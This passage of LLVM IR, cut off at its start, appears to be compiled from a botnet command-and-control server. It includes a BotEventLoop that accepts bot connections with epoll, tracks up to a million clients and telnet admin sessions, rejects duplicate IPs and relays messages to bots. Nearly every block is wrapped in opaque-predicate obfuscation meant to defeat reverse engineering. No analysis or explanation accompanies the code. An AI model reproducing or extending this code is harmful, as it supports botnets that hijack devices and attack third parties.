  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %130, label %140, label %139

; <label>:139:                                    ; preds = %originalBBpart216, %originalBBpart212, %originalBBpart24
  br label %200

; <label>:140:                                    ; preds = %originalBBpart216, %originalBBpart28
  %141 = load i32, i32* %7, align 4
  %142 = icmp ne i32 %141, 0
  br i1 %142, label %143, label %176

; <label>:143:                                    ; preds = %140
  %144 = load i32, i32* %12, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %145
  %147 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %146, i32 0, i32 0
  %148 = load i32, i32* %147, align 4
  %149 = icmp ne i32 %148, 0
  br i1 %149, label %150, label %176

; <label>:150:                                    ; preds = %143
  %151 = load i32, i32* @x.3
  %152 = load i32, i32* @y.4
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %150
  %159 = load i32, i32* %12, align 4
  %160 = call i64 @send(i32 %159, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i64 5, i32 16384)
  %161 = load i32, i32* %12, align 4
  %162 = load i8*, i8** %6, align 8
  %163 = load i8*, i8** %6, align 8
  %164 = call i64 @strlen(i8* %163) #8
  %165 = call i64 @send(i32 %161, i8* %162, i64 %164, i32 16384)
  %166 = load i32, i32* %12, align 4
  %167 = call i64 @send(i32 %166, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  %168 = load i32, i32* @x.3
  %169 = load i32, i32* @y.4
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %176

; <label>:176:                                    ; preds = %originalBBpart220, %143, %140
  %177 = load i32, i32* %12, align 4
  %178 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i32 0, i32 0), i32 %177)
  %179 = load i32, i32* %12, align 4
  %180 = load i8*, i8** %4, align 8
  %181 = load i8*, i8** %4, align 8
  %182 = call i64 @strlen(i8* %181) #8
  %183 = call i64 @send(i32 %179, i8* %180, i64 %182, i32 16384)
  %184 = load i32, i32* %7, align 4
  %185 = icmp ne i32 %184, 0
  br i1 %185, label %186, label %196

; <label>:186:                                    ; preds = %176
  %187 = load i32, i32* %12, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %188
  %190 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 4
  %192 = icmp ne i32 %191, 0
  br i1 %192, label %193, label %196

; <label>:193:                                    ; preds = %186
  %194 = load i32, i32* %12, align 4
  %195 = call i64 @send(i32 %194, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i32 0, i32 0), i64 13, i32 16384)
  br label %199

; <label>:196:                                    ; preds = %186, %176
  %197 = load i32, i32* %12, align 4
  %198 = call i64 @send(i32 %197, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0), i64 1, i32 16384)
  br label %199

; <label>:199:                                    ; preds = %196, %193
  br label %200

; <label>:200:                                    ; preds = %199, %139
  %201 = load i32, i32* @x.3
  %202 = load i32, i32* @y.4
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %200
  %209 = load i32, i32* %12, align 4
  %210 = add nsw i32 %209, 1
  store i32 %210, i32* %12, align 4
  %211 = load i32, i32* @x.3
  %212 = load i32, i32* @y.4
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart228, label %originalBB22alteredBB

originalBBpart228:                                ; preds = %originalBB22
  br label %51

; <label>:219:                                    ; preds = %51
  %220 = load i32, i32* @x.3
  %221 = load i32, i32* @y.4
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %219
  %228 = load i8*, i8** %8, align 8
  call void @free(i8* %228) #7
  %229 = load i32, i32* @x.3
  %230 = load i32, i32* @y.4
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %16
  store i32 0, i32* %7, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  %237 = load i32, i32* %12, align 4
  %238 = load i32, i32* %5, align 4
  %239 = icmp eq i32 %237, %238
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  %240 = load i32, i32* %12, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %241
  %243 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %242, i32 0, i32 1
  %244 = load i8, i8* %243, align 4
  %245 = icmp ne i8 %244, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %97
  %246 = load i32, i32* %7, align 4
  %247 = icmp eq i32 %246, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %116
  %248 = load i32, i32* %12, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %249
  %251 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %250, i32 0, i32 0
  %252 = load i32, i32* %251, align 4
  %253 = icmp ne i32 %252, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %150
  %254 = load i32, i32* %12, align 4
  %255 = call i64 @send(i32 %254, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i64 5, i32 16384)
  %256 = load i32, i32* %12, align 4
  %257 = load i8*, i8** %6, align 8
  %258 = load i8*, i8** %6, align 8
  %259 = call i64 @strlen(i8* %258) #8
  %260 = call i64 @send(i32 %256, i8* %257, i64 %259, i32 16384)
  %261 = load i32, i32* %12, align 4
  %262 = call i64 @send(i32 %261, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %200
  %263 = load i32, i32* %12, align 4
  %_ = sub i32 0, %263
  %gen = add i32 %_, 1
  %_23 = sub i32 0, %263
  %gen24 = add i32 %_23, 1
  %_25 = sub i32 0, %263
  %gen26 = add i32 %_25, 1
  %264 = add nsw i32 %263, 1
  store i32 %264, i32* %12, align 4
  br label %originalBB22

originalBB30alteredBB:                            ; preds = %originalBB30, %219
  %265 = load i8*, i8** %8, align 8
  call void @free(i8* %265) #7
  br label %originalBB30
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @BotEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.clientdata_t*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i64, align 8
  %18 = alloca [2048 x i8], align 16
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %22 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %23 = bitcast i8* %22 to %struct.epoll_event*
  store %struct.epoll_event* %23, %struct.epoll_event** %5, align 8
  br label %24

; <label>:24:                                     ; preds = %618, %1
  %25 = load volatile i32, i32* @epollFD, align 4
  %26 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %27 = call i32 @epoll_wait(i32 %25, %struct.epoll_event* %26, i32 1000000, i32 -1)
  store i32 %27, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %28

; <label>:28:                                     ; preds = %originalBBpart288, %24
  %29 = load i32, i32* %8, align 4
  %30 = load i32, i32* %7, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %618

; <label>:32:                                     ; preds = %28
  %33 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %33, i64 %35
  %37 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %36, i32 0, i32 0
  %38 = load i32, i32* %37, align 1
  %39 = and i32 %38, 8
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %75, label %41

; <label>:41:                                     ; preds = %32
  %42 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %43 = load i32, i32* %8, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %42, i64 %44
  %46 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %45, i32 0, i32 0
  %47 = load i32, i32* %46, align 1
  %48 = and i32 %47, 16
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %75, label %50

; <label>:50:                                     ; preds = %41
  %51 = load i32, i32* @x.5
  %52 = load i32, i32* @y.6
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %60 = load i32, i32* %8, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 0
  %64 = load i32, i32* %63, align 1
  %65 = and i32 %64, 1
  %66 = icmp ne i32 %65, 0
  %67 = load i32, i32* @x.5
  %68 = load i32, i32* @y.6
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %66, label %94, label %75

; <label>:75:                                     ; preds = %originalBBpart2, %41, %32
  %76 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %77 = load i32, i32* %8, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %76, i64 %78
  %80 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i32 0, i32 1
  %81 = bitcast %union.epoll_data* %80 to i32*
  %82 = load i32, i32* %81, align 1
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %83
  %85 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %84, i32 0, i32 1
  store i8 0, i8* %85, align 4
  %86 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %87 = load i32, i32* %8, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %86, i64 %88
  %90 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %89, i32 0, i32 1
  %91 = bitcast %union.epoll_data* %90 to i32*
  %92 = load i32, i32* %91, align 1
  %93 = call i32 @close(i32 %92)
  br label %599

; <label>:94:                                     ; preds = %originalBBpart2
  %95 = load volatile i32, i32* @listenFD, align 4
  %96 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %97 = load i32, i32* %8, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %96, i64 %98
  %100 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %99, i32 0, i32 1
  %101 = bitcast %union.epoll_data* %100 to i32*
  %102 = load i32, i32* %101, align 1
  %103 = icmp eq i32 %95, %102
  br i1 %103, label %104, label %315

; <label>:104:                                    ; preds = %94
  %105 = load i32, i32* @x.5
  %106 = load i32, i32* @y.6
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %104
  %113 = load i32, i32* @x.5
  %114 = load i32, i32* @y.6
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br label %121

; <label>:121:                                    ; preds = %307, %251, %248, %originalBBpart211
  store i32 16, i32* %10, align 4
  %122 = load volatile i32, i32* @listenFD, align 4
  %123 = call i32 @accept(i32 %122, %struct.sockaddr* %9, i32* %10)
  store i32 %123, i32* %11, align 4
  %124 = load i32, i32* %11, align 4
  %125 = icmp eq i32 %124, -1
  br i1 %125, label %126, label %136

; <label>:126:                                    ; preds = %121
  %127 = call i32* @__errno_location() #9
  %128 = load i32, i32* %127, align 4
  %129 = icmp eq i32 %128, 11
  br i1 %129, label %134, label %130

; <label>:130:                                    ; preds = %126
  %131 = call i32* @__errno_location() #9
  %132 = load i32, i32* %131, align 4
  %133 = icmp eq i32 %132, 11
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %130, %126
  br label %314

; <label>:135:                                    ; preds = %130
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0))
  br label %314

; <label>:136:                                    ; preds = %121
  %137 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %138 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %137, i32 0, i32 2
  %139 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %138, i32 0, i32 0
  %140 = load i32, i32* %139, align 2
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %142
  %144 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %143, i32 0, i32 0
  store i32 %140, i32* %144, align 8
  store i32 0, i32* %13, align 4
  store i32 0, i32* %12, align 4
  br label %145

; <label>:145:                                    ; preds = %222, %136
  %146 = load i32, i32* @x.5
  %147 = load i32, i32* @y.6
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %145
  %154 = load i32, i32* %12, align 4
  %155 = icmp slt i32 %154, 1000000
  %156 = load i32, i32* @x.5
  %157 = load i32, i32* @y.6
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br i1 %155, label %164, label %225

; <label>:164:                                    ; preds = %originalBBpart215
  %165 = load i32, i32* %12, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %166
  %168 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %167, i32 0, i32 1
  %169 = load i8, i8* %168, align 4
  %170 = icmp ne i8 %169, 0
  br i1 %170, label %171, label %191

; <label>:171:                                    ; preds = %164
  %172 = load i32, i32* @x.5
  %173 = load i32, i32* @y.6
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %171
  %180 = load i32, i32* %12, align 4
  %181 = load i32, i32* %11, align 4
  %182 = icmp eq i32 %180, %181
  %183 = load i32, i32* @x.5
  %184 = load i32, i32* @y.6
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %182, label %191, label %208

; <label>:191:                                    ; preds = %originalBBpart219, %164
  %192 = load i32, i32* @x.5
  %193 = load i32, i32* @y.6
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %191
  %200 = load i32, i32* @x.5
  %201 = load i32, i32* @y.6
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %222

; <label>:208:                                    ; preds = %originalBBpart219
  %209 = load i32, i32* %12, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %210
  %212 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 8
  %214 = load i32, i32* %11, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %215
  %217 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp eq i32 %213, %218
  br i1 %219, label %220, label %221

; <label>:220:                                    ; preds = %208
  store i32 1, i32* %13, align 4
  br label %225

; <label>:221:                                    ; preds = %208
  br label %222

; <label>:222:                                    ; preds = %221, %originalBBpart223
  %223 = load i32, i32* %12, align 4
  %224 = add nsw i32 %223, 1
  store i32 %224, i32* %12, align 4
  br label %145

; <label>:225:                                    ; preds = %220, %originalBBpart215
  %226 = load i32, i32* @x.5
  %227 = load i32, i32* @y.6
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %225
  %234 = load i32, i32* %13, align 4
  %235 = icmp ne i32 %234, 0
  %236 = load i32, i32* @x.5
  %237 = load i32, i32* @y.6
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %235, label %244, label %254

; <label>:244:                                    ; preds = %originalBBpart227
  %245 = load i32, i32* %11, align 4
  %246 = call i64 @send(i32 %245, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i32 0, i32 0), i64 13, i32 16384)
  %247 = icmp eq i64 %246, -1
  br i1 %247, label %248, label %251

; <label>:248:                                    ; preds = %244
  %249 = load i32, i32* %11, align 4
  %250 = call i32 @close(i32 %249)
  br label %121

; <label>:251:                                    ; preds = %244
  %252 = load i32, i32* %11, align 4
  %253 = call i32 @close(i32 %252)
  br label %121

; <label>:254:                                    ; preds = %originalBBpart227
  %255 = load i32, i32* @x.5
  %256 = load i32, i32* @y.6
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %254
  %263 = load i32, i32* %11, align 4
  %264 = call i32 @make_socket_non_blocking(i32 %263)
  store i32 %264, i32* %6, align 4
  %265 = load i32, i32* %6, align 4
  %266 = icmp eq i32 %265, -1
  %267 = load i32, i32* @x.5
  %268 = load i32, i32* @y.6
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %266, label %275, label %278

; <label>:275:                                    ; preds = %originalBBpart231
  %276 = load i32, i32* %11, align 4
  %277 = call i32 @close(i32 %276)
  br label %314

; <label>:278:                                    ; preds = %originalBBpart231
  %279 = load i32, i32* @x.5
  %280 = load i32, i32* @y.6
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %278
  %287 = load i32, i32* %11, align 4
  %288 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %289 = bitcast %union.epoll_data* %288 to i32*
  store i32 %287, i32* %289, align 1
  %290 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %290, align 1
  %291 = load volatile i32, i32* @epollFD, align 4
  %292 = load i32, i32* %11, align 4
  %293 = call i32 @epoll_ctl(i32 %291, i32 1, i32 %292, %struct.epoll_event* %4) #7
  store i32 %293, i32* %6, align 4
  %294 = load i32, i32* %6, align 4
  %295 = icmp eq i32 %294, -1
  %296 = load i32, i32* @x.5
  %297 = load i32, i32* @y.6
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %295, label %304, label %307

; <label>:304:                                    ; preds = %originalBBpart235
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  %305 = load i32, i32* %11, align 4
  %306 = call i32 @close(i32 %305)
  br label %314

; <label>:307:                                    ; preds = %originalBBpart235
  %308 = load i32, i32* %11, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %309
  %311 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %310, i32 0, i32 1
  store i8 1, i8* %311, align 4
  %312 = load i32, i32* %11, align 4
  %313 = call i64 @send(i32 %312, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i32 0, i32 0), i64 14, i32 16384)
  br label %121

; <label>:314:                                    ; preds = %304, %275, %135, %134
  br label %599

; <label>:315:                                    ; preds = %94
  %316 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %317 = load i32, i32* %8, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %316, i64 %318
  %320 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %319, i32 0, i32 1
  %321 = bitcast %union.epoll_data* %320 to i32*
  %322 = load i32, i32* %321, align 1
  store i32 %322, i32* %14, align 4
  %323 = load i32, i32* %14, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %324
  store %struct.clientdata_t* %325, %struct.clientdata_t** %15, align 8
  store i32 0, i32* %16, align 4
  %326 = load %struct.clientdata_t*, %struct.clientdata_t** %15, align 8
  %327 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %326, i32 0, i32 1
  store i8 1, i8* %327, align 4
  br label %328

; <label>:328:                                    ; preds = %originalBBpart282, %315
  %329 = load i32, i32* @x.5
  %330 = load i32, i32* @y.6
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %328
  %337 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %337, i8 0, i64 2048, i32 16, i1 false)
  %338 = load i32, i32* @x.5
  %339 = load i32, i32* @y.6
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %346

; <label>:346:                                    ; preds = %originalBBpart274, %521, %originalBBpart270, %originalBBpart262, %originalBBpart258, %originalBBpart251, %originalBBpart239
  %347 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %347, i8 0, i64 2048, i32 16, i1 false)
  %348 = icmp ne i8* %347, null
  br i1 %348, label %349, label %371

; <label>:349:                                    ; preds = %346
  %350 = load i32, i32* @x.5
  %351 = load i32, i32* @y.6
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %349
  %358 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %359 = load i32, i32* %14, align 4
  %360 = call i32 @fdgets(i8* %358, i32 2048, i32 %359)
  %361 = sext i32 %360 to i64
  store i64 %361, i64* %17, align 8
  %362 = icmp sgt i64 %361, 0
  %363 = load i32, i32* @x.5
  %364 = load i32, i32* @y.6
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %371

; <label>:371:                                    ; preds = %originalBBpart243, %346
  %372 = phi i1 [ false, %346 ], [ %362, %originalBBpart243 ]
  br i1 %372, label %373, label %541

